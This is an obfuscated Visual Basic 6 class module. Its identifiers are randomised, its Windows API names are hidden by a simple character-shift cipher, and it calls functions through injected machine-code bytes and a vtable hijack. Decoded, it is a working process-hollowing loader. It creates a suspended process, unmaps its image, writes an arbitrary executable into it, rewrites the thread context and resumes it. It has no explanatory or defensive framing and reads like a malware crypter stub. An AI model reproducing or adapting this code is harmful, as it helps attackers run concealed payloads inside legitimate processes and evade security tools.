VERSION 1.0 CLASS
BEGIN
  MultiUse = -1
  Persistable = 0
  DataBindingBehavior = 0
  DataSourceBehavior = 0
  MTSTransactionMode = 0
End
Attribute VB_Name = "S9JI"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Const CnyT3apK                  As Long = &H5A4D&
Private Const Mi5Q                  As Long = &H4550&
Private Const MilWRIOmTU                     As Long = &H40
Private Const OVccAB                     As Long = &HF8
Private Const McEU                  As Long = &H28
Private Const ICAnQ                  As Long = &H28
Private Const LR3H                    As String = "8B4C2408B830000000648B008B400C8B401C8B008B4008890131C0C3"
Private Const TElg798RWP                     As String = "8B4C240851<PATCH1>E8<PATCH2>5989016631C0C3"
Private Const XeprVzDjJ                       As String = "<PATCH1>"
Private Const Bzs4M                      As String = "<PATCH2>"
Private Const TqeS                     As Long = &H10007
Private Const BGbMNRQ                     As Long = &H4
Private Const IpfKWPO                     As Long = &H1000
Private Const OPjIfNxXU                     As Long = &H2000
Private Const KVhvC                  As Long = &H40
Private Type UOxQVN
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type
Private Type SY4BQ
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type
Private Type UAkh8dJ
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type
Private Type IlfY
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As  UAkh8dJ
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type
Private Type Q9msLYDtB
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type
Private Type NvA
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type
Private Type QLUBqA1sR
    VirtualAddress              As Long
    Size                        As Long
End Type
Private Type DvG
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As QLUBqA1sR
End Type
Private Type YXeF
    Signature                   As Long
    FileHeader                  As NvA
    OptionalHeader              As DvG
End Type
Private Type S3RM
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type
Private Type Ge1p8lCE
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type
private Declare Sub FqRhM Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
Private c_lKrnl         As Long
Private c_lLoadLib      As Long
Private c_bInit         As Boolean
Private c_lVTE          As Long
Private c_lOldVTE       As Long
Private c_bvASM(&HFF)   As Byte
Public Function D650sjVS() As Long
End Function
Public Function Rc802AVG(ByRef HNDiV() As Byte, Optional FrOrM As String) As Boolean
  Dim i                       As Long
  Dim X3LJaJ                  As Q9msLYDtB
  Dim CrL                   As YXeF
  Dim JoMK                    As Ge1p8lCE
  Dim XLh9Tv1GCU                   As UOxQVN
  Dim B1ilAM                  As SY4BQ
  Dim RqsI9AWH                    As IlfY
  Dim Hqk9cNE                    As Long
  Dim WllLqlB                    As Long
  Dim MgmX59BI                    As Long
  If Not c_bInit Then Exit Function
  Call FqRhM(X3LJaJ, HNDiV(0), MilWRIOmTU)
  If Not X3LJaJ.e_magic = CnyT3apK Then
  Exit Function
  End If
  Call FqRhM(CrL, HNDiV(X3LJaJ.e_lfanew), OVccAB)
  If Not CrL.Signature = Mi5Q Then
  Exit Function
End If
  Hqk9cNE = EZXL(ExBI1J0LOM("icplcj10"))
  MgmX59BI = EZXL(ExBI1J0LOM("lrbjj"))
  If FrOrM = vbNullString Then
  FrOrM = Space(260)
  WllLqlB = PbM8Q(Hqk9cNE, ExBI1J0LOM("EcrKmbsjcDgjcL_kcU"))
  N0LVAickWT WllLqlB, App.hInstance, StrPtr(FrOrM), 260
  End If
  With CrL.OptionalHeader
  XLh9Tv1GCU.cb = Len(XLh9Tv1GCU)
  WllLqlB = PbM8Q(Hqk9cNE, ExBI1J0LOM("Apc_rcNpmacqqU"))
  N0LVAickWT WllLqlB, 0, StrPtr(FrOrM), 0, 0, 0, BGbMNRQ, 0, 0, VarPtr(XLh9Tv1GCU), VarPtr(B1ilAM)
  WllLqlB = PbM8Q(MgmX59BI, ExBI1J0LOM("LrSlk_nTgcuMdQcargml"))
  N0LVAickWT WllLqlB, B1ilAM.hProcess, .ImageBase
  WllLqlB = PbM8Q(Hqk9cNE, ExBI1J0LOM("Tgprs_j?jjmaCv"))
  N0LVAickWT WllLqlB, B1ilAM.hProcess, .ImageBase, .SizeOfImage, IpfKWPO Or OPjIfNxXU, KVhvC
  WllLqlB = PbM8Q(Hqk9cNE, ExBI1J0LOM("UpgrcNpmacqqKckmpw"))
  N0LVAickWT WllLqlB, B1ilAM.hProcess, .ImageBase, VarPtr(HNDiV(0)), .SizeOfHeaders, 0
  For i = 0 To CrL.FileHeader.NumberOfSections - 1
  FqRhM JoMK, HNDiV(X3LJaJ.e_lfanew + OVccAB + ICAnQ * i), Len(JoMK)
  N0LVAickWT WllLqlB, B1ilAM.hProcess, .ImageBase + JoMK.VirtualAddress, VarPtr(HNDiV(JoMK.PointerToRawData)), JoMK.SizeOfRawData, 0
  Next i
  RqsI9AWH.ContextFlags = TqeS
  WllLqlB = PbM8Q(MgmX59BI, ExBI1J0LOM("LrEcrAmlrcvrRfpc_b"))
  N0LVAickWT WllLqlB, B1ilAM.hThread, VarPtr(RqsI9AWH)
  WllLqlB = PbM8Q(Hqk9cNE, ExBI1J0LOM("UpgrcNpmacqqKckmpw"))
  N0LVAickWT WllLqlB, B1ilAM.hProcess, RqsI9AWH.Ebx + 8, VarPtr(.ImageBase), 4, 0
  RqsI9AWH.Eax = .ImageBase + .AddressOfEntryPoint
  WllLqlB = PbM8Q(MgmX59BI, ExBI1J0LOM("LrQcrAmlrcvrRfpc_b"))
  N0LVAickWT WllLqlB, B1ilAM.hThread, VarPtr(RqsI9AWH)
  WllLqlB = PbM8Q(MgmX59BI, ExBI1J0LOM("LrPcqskcRfpc_b"))
  N0LVAickWT WllLqlB, B1ilAM.hThread, 0
  End With
  Rc802AVG = True
End Function
Public Function N0LVAickWT(ByVal Rf0fS As Long, ParamArray P4z2DiIjWV()) As Long
  Dim FpN        As Long
  Dim i           As Long
  Dim CxD        As String
  Dim GOIXY        As String
  If Rf0fS = 0 Then Exit Function
  For i = UBound(P4z2DiIjWV) To 0 Step -1
  GOIXY = GOIXY & "68" & HirVkAH(CLng(P4z2DiIjWV(i)))
  Next
  FpN = VarPtr(c_bvASM(0))
  FpN = FpN + (UBound(P4z2DiIjWV) + 2) * 5
  FpN = Rf0fS - FpN - 5
  CxD = TElg798RWP
  CxD = Replace(CxD, XeprVzDjJ, GOIXY)
  CxD = Replace(CxD, Bzs4M, HirVkAH(FpN))
  Call OJmA9T(CxD)
  N0LVAickWT = WVS
End Function
Private Function HirVkAH(ByVal X9CyE As Long) As String
  Dim Bp0RgP(3)   As Byte
  Dim i           As Long
  FqRhM Bp0RgP(0), X9CyE, &H4
  For i = 0 To 3
  HirVkAH = HirVkAH & Right("0" & Hex(Bp0RgP(i)), 2)
  Next
End Function
Private Sub OJmA9T(ByVal YLvHL As String)
  Dim i   As Long
  For i = 0 To Len(YLvHL) - 1 Step 2
  c_bvASM((i / 2)) = CByte("&h" & Mid$(YLvHL, i + 1, 2))
  Next
End Sub
Private Function WVS() As Long
  FqRhM c_lVTE, ByVal ObjPtr(Me), &H4
  c_lVTE = c_lVTE + &H1C
  FqRhM c_lOldVTE, ByVal c_lVTE, &H4
  FqRhM ByVal c_lVTE, VarPtr(c_bvASM(0)), &H4
  WVS = D650sjVS
  FqRhM ByVal c_lVTE, c_lOldVTE, &H4
End Function
Public Function As4GI(ByVal EuzFSZA As String, ByVal C96zV7ipB As String) As Long
  As4GI = Me.PbM8Q(Me.EZXL(EuzFSZA), C96zV7ipB)
End Function
Public Function EZXL(ByVal H8K7LB As String) As Long
  EZXL = N0LVAickWT(c_lLoadLib, StrPtr(H8K7LB & vbNullChar))
End Function
Public Property Get Initialized() As Boolean
  Initialized = c_bInit
End Property
Private Sub Class_Initialize()
  Call OJmA9T(LR3H)
  c_lKrnl = WVS
  If Not c_lKrnl = 0 Then
  c_lLoadLib = PbM8Q(c_lKrnl, ExBI1J0LOM("Jm_bJg`p_pwU"))
  If Not c_lLoadLib = 0 Then
  c_bInit = True
  End If
  End If
End Sub
Public Function PbM8Q(ByVal UzCX As Long, ByVal GYUI3VJ4FH As String) As Long
  Dim XXQTxYpFuX                  As Q9msLYDtB
  Dim EzB                   As YXeF
  Dim NGwTX0L                   As S3RM
  Call FqRhM(XXQTxYpFuX, ByVal UzCX, MilWRIOmTU)
  If Not XXQTxYpFuX.e_magic = CnyT3apK Then
  Exit Function
  End If
  Call FqRhM(EzB, ByVal UzCX + XXQTxYpFuX.e_lfanew, OVccAB)
  If Not EzB.Signature = Mi5Q Then
  Exit Function
  End If
  Dim lVAddress   As Long
  Dim lVSize      As Long
  Dim lBase       As Long
  With EzB.OptionalHeader
  lVAddress = UzCX + .DataDirectory(0).VirtualAddress
  lVSize = lVAddress + .DataDirectory(0).Size
  lBase = .ImageBase
  End With
  Call FqRhM(NGwTX0L, ByVal lVAddress, McEU)
  Dim i           As Long
  Dim lFunctAdd   As Long
  Dim lNameAdd    As Long
  Dim lNumbAdd    As Long
  With NGwTX0L
  For i = 0 To .NumberOfNames - 1
  FqRhM lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4, 4
  If XvSgizhD(lBase + lNameAdd) = GYUI3VJ4FH Then
  FqRhM lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2, 2
  FqRhM lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4, 4
  PbM8Q = lFunctAdd + lBase
  If PbM8Q >= lVAddress And PbM8Q <= lVSize Then
  Call TBIxVP(PbM8Q, UzCX, GYUI3VJ4FH)
  If Not UzCX = 0 Then
  PbM8Q = PbM8Q(UzCX, GYUI3VJ4FH)
  Else
  PbM8Q = 0
  End If
  End If
  Exit Function
  End If
  Next
  End With
End Function
Private Function TBIxVP( ByVal HsbO As Long, ByRef R2bcdmU As Long, ByRef GeMwIKi4aJ As String)
  Dim JyEMHmC     As String
  JyEMHmC = XvSgizhD(HsbO)
  If InStr(1, JyEMHmC, ".") Then
  R2bcdmU = EZXL(split(JyEMHmC, ".")(0))
  GeMwIKi4aJ = split(JyEMHmC, ".")(1)
  End If
End Function
Private Function XvSgizhD(ByVal JcdPD As Long) As String
  Dim IGY       As Byte
  Do
  FqRhM IGY, ByVal JcdPD, 1
  JcdPD = JcdPD + 1
  If IGY = 0 Then Exit Do
  XvSgizhD = XvSgizhD & Chr$(IGY)
  Loop
End Function
Public Function ExBI1J0LOM(Pn4W) As String
  Dim WcBAcpVhrR As Long
  Dim Nqd1pL As Long
  Dim QAO As String
  For WcBAcpVhrR = 1 To Len(Pn4W)
  Nqd1pL = Asc(Mid(Pn4W, WcBAcpVhrR, 1)) + 2
  QAO = QAO & Chr(Nqd1pL)
  Next WcBAcpVhrR
  ExBI1J0LOM = QAO
End Function
